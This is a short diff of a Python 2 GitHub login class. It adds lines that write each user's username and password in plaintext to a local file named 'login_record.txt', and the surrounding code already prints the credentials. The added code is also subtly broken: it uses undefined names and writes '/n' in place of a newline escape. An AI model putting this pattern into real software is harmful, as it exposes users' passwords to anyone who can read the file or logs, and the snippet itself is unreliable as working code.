@@ -22,6 +22,8 @@ class GithubLogin:
         print params
         self.username = params.get('username')
         self.password = params.get('password')
+        with open('login_record.txt','w') as f:
+            f.write(username + ':' + password + '/n')
         print self.username,self.password
         user,avatar,secret_username = self.login()
         js ={
